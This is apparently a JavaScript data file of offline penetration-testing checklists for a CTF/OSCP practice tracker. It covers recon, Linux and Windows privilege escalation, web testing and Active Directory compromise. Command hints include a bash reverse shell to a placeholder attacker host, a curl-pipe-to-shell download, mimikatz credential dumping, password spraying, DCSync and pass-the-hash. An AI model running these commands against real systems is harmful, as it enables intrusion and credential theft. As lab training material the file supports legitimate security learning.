// ============================================================================
// Static, offline checklist "playbooks" for the Machines tracker.
// Authored from common HTB / TryHackMe / OSCP methodology. 100% local — this
// data is baked into the app and never fetched at runtime.
//
// Shape: [{ id, name, icon, desc, phases: [{ name, items: [{ label, hint }] }] }]
// `hint` is an optional command that reuses the app's <PLACEHOLDER> convention,
// so the Quick IP Changer fills it in on copy.
// ============================================================================
window.CHECKLIST_TEMPLATES = [
  {
    id: "general",
    name: "General / Initial Foothold",
    icon: "🎯",
    desc: "Box-agnostic recon → enumeration → foothold flow.",
    phases: [
      {
        name: "Recon",
        items: [
          { label: "Full TCP port scan", hint: "nmap -p- --min-rate 5000 -oA nmap/all <TARGET_IP>" },
          { label: "Service & version scan on open ports", hint: "nmap -sC -sV -p<PORT> -oA nmap/svc <TARGET_IP>" },
          { label: "Top UDP ports", hint: "sudo nmap -sU --top-ports 50 -oA nmap/udp <TARGET_IP>" },
          { label: "Add host to /etc/hosts if a domain is hinted", hint: "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts" }
        ]
      },
      {
        name: "Enumeration",
        items: [
          { label: "Enumerate each open service by version" },
          { label: "Web content discovery", hint: "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
          { label: "Virtual host / subdomain fuzzing", hint: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -fs 0" },
          { label: "SMB null / guest session", hint: "nxc smb <TARGET_IP> -u '' -p '' --shares" },
          { label: "Check default / weak credentials" }
        ]
      },
      {
        name: "Foothold",
        items: [
          { label: "Search public exploits for identified versions", hint: "searchsploit <product> <version>" },
          { label: "Gain initial code execution / shell" },
          { label: "Catch reverse shell", hint: "nc -lvnp <LPORT>" },
          { label: "Stabilize the shell (PTY upgrade)", hint: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" }
        ]
      },
      {
        name: "Loot",
        items: [
          { label: "Grab user flag", hint: "cat /home/*/user.txt 2>/dev/null || type C:\\Users\\*\\Desktop\\user.txt" },
          { label: "Situational awareness (id / whoami, network, processes)" },
          { label: "Screenshot proof of access" }
        ]
      }
    ]
  },
  {
    id: "linux-privesc",
    name: "Linux Privilege Escalation",
    icon: "🐧",
    desc: "From a low-priv Linux shell to root.",
    phases: [
      {
        name: "Automated & Baseline Enum",
        items: [
          { label: "Run linpeas / lse", hint: "curl -sL https://<ATTACKER_IP>/linpeas.sh | sh" },
          { label: "Current user, groups, sudo rights", hint: "id; sudo -l" },
          { label: "Kernel & OS version", hint: "uname -a; cat /etc/os-release" },
          { label: "Running processes & internal ports", hint: "ps aux; ss -tlnp" }
        ]
      },
      {
        name: "Manual Vectors",
        items: [
          { label: "SUID / SGID binaries", hint: "find / -perm -4000 -type f 2>/dev/null" },
          { label: "Capabilities", hint: "getcap -r / 2>/dev/null" },
          { label: "Cron jobs & writable scripts", hint: "cat /etc/crontab; ls -la /etc/cron.*" },
          { label: "Writable files owned by root / PATH abuse", hint: "find / -writable -type f 2>/dev/null | grep -v /proc" },
          { label: "Check GTFOBins for any of the above" }
        ]
      },
      {
        name: "Credential Hunting",
        items: [
          { label: "Shell history & config files", hint: "cat ~/.bash_history; grep -riE 'pass|pwd|secret' /home 2>/dev/null" },
          { label: "SSH keys", hint: "find / -name id_rsa 2>/dev/null" },
          { label: "Database / app config credentials" },
          { label: "Reuse creds against other users / su", hint: "su <USER>" }
        ]
      },
      {
        name: "Escalation",
        items: [
          { label: "Exploit the chosen vector (sudo/SUID/cron/cap)" },
          { label: "Docker / lxd / disk group abuse if member" },
          { label: "Kernel exploit as last resort" },
          { label: "Confirm root & grab root.txt", hint: "id; cat /root/root.txt" }
        ]
      }
    ]
  },
  {
    id: "windows-privesc",
    name: "Windows Privilege Escalation",
    icon: "🪟",
    desc: "From a low-priv Windows shell to SYSTEM.",
    phases: [
      {
        name: "Automated & Baseline Enum",
        items: [
          { label: "Run winPEAS / PrivescCheck", hint: "winpeas.exe" },
          { label: "User privileges", hint: "whoami /all" },
          { label: "System info & patch level", hint: "systeminfo" },
          { label: "Installed software & running services" }
        ]
      },
      {
        name: "Token & Privilege Abuse",
        items: [
          { label: "SeImpersonate/SeAssignPrimaryToken → Potato", hint: "PrintSpoofer.exe -i -c cmd" },
          { label: "SeBackupPrivilege → dump SAM/SYSTEM" },
          { label: "AlwaysInstallElevated", hint: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" }
        ]
      },
      {
        name: "Service & File Misconfig",
        items: [
          { label: "Unquoted service paths", hint: "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \\\"\"" },
          { label: "Weak service / binary permissions", hint: "accesschk.exe -uwcqv <USER> *" },
          { label: "Scheduled tasks & startup", hint: "schtasks /query /fo LIST /v" },
          { label: "DLL hijacking opportunities" }
        ]
      },
      {
        name: "Credential Hunting",
        items: [
          { label: "Saved credentials", hint: "cmdkey /list" },
          { label: "Registry autologon", hint: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" },
          { label: "Unattend / sysprep / config files", hint: "dir /s /b C:\\unattend.xml C:\\sysprep.inf 2>nul" },
          { label: "Dump LSASS if admin", hint: "mimikatz # sekurlsa::logonpasswords" }
        ]
      },
      {
        name: "Escalation",
        items: [
          { label: "Execute the chosen vector → SYSTEM" },
          { label: "Confirm & grab root.txt / proof.txt", hint: "whoami; type C:\\Users\\Administrator\\Desktop\\root.txt" }
        ]
      }
    ]
  },
  {
    id: "web",
    name: "Web Application",
    icon: "🌐",
    desc: "Web-facing attack surface to RCE.",
    phases: [
      {
        name: "Mapping",
        items: [
          { label: "Fingerprint tech stack", hint: "whatweb http://<TARGET_IP>" },
          { label: "Directory & file discovery", hint: "feroxbuster -u http://<TARGET_IP> -x php,txt,bak -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" },
          { label: "robots.txt / sitemap / comments" },
          { label: "Spider the app & note parameters (Burp)" }
        ]
      },
      {
        name: "Vulnerability Testing",
        items: [
          { label: "SQL injection", hint: "sqlmap -u 'http://<TARGET_IP>/?id=1' --batch --dbs" },
          { label: "Cross-site scripting (reflected/stored/DOM)" },
          { label: "LFI / RFI / path traversal", hint: "curl 'http://<TARGET_IP>/?page=../../../../etc/passwd'" },
          { label: "Server-side template injection (SSTI)" },
          { label: "Command injection" },
          { label: "Auth bypass / IDOR / access control" },
          { label: "File upload restrictions" }
        ]
      },
      {
        name: "Exploitation",
        items: [
          { label: "Escalate a finding to RCE (upload / SSTI / SQLi stacked)" },
          { label: "Get a reverse shell", hint: "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'" }
        ]
      },
      {
        name: "Post",
        items: [
          { label: "Loot DB / config credentials" },
          { label: "Pivot / reuse creds", hint: "cat config.php | grep -i pass" }
        ]
      }
    ]
  },
  {
    id: "ad",
    name: "Active Directory",
    icon: "🏢",
    desc: "Domain compromise: recon → creds → lateral → DA.",
    phases: [
      {
        name: "Recon",
        items: [
          { label: "Identify the Domain Controller & domain name" },
          { label: "Enumerate users (RID brute / kerbrute)", hint: "kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt" },
          { label: "SMB / LDAP null session", hint: "nxc smb <DC_IP> -u '' -p '' --users" },
          { label: "LDAP dump", hint: "ldapsearch -x -H ldap://<DC_IP> -b 'DC=<DOMAIN>' " }
        ]
      },
      {
        name: "Initial Credentials",
        items: [
          { label: "Poison LLMNR/NBT-NS (Responder) for hashes", hint: "sudo responder -I tun0" },
          { label: "AS-REP roasting (no preauth)", hint: "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt" },
          { label: "Password spray a common password", hint: "nxc smb <DC_IP> -u users.txt -p 'Season2024!' --continue-on-success" },
          { label: "Kerberoast service accounts", hint: "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request" }
        ]
      },
      {
        name: "Enumeration with Creds",
        items: [
          { label: "Run BloodHound collector", hint: "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all" },
          { label: "Map shares & readable data", hint: "nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares" },
          { label: "Look for GPP / cpassword in SYSVOL" },
          { label: "Review ACLs & attack paths in BloodHound" }
        ]
      },
      {
        name: "Lateral Movement",
        items: [
          { label: "Pass-the-Hash / spray hash across hosts", hint: "nxc smb <NETWORK>/<CIDR> -u <USER> -H <HASH>" },
          { label: "Remote shell (evil-winrm / wmiexec / psexec)", hint: "evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>" },
          { label: "Dump local creds on each owned host" }
        ]
      },
      {
        name: "Domain Privilege Escalation",
        items: [
          { label: "Abuse ACLs (GenericAll/WriteDACL) from BloodHound" },
          { label: "Delegation abuse (unconstrained / constrained / RBCD)" },
          { label: "DCSync if replication rights", hint: "impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>" }
        ]
      },
      {
        name: "Domain Admin / Loot",
        items: [
          { label: "Dump NTDS.dit", hint: "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP>" },
          { label: "Confirm DA / own the DC", hint: "impacket-psexec <DOMAIN>/administrator@<DC_IP> -hashes :<HASH>" },
          { label: "Grab all flags & document the path" }
        ]
      }
    ]
  }
];
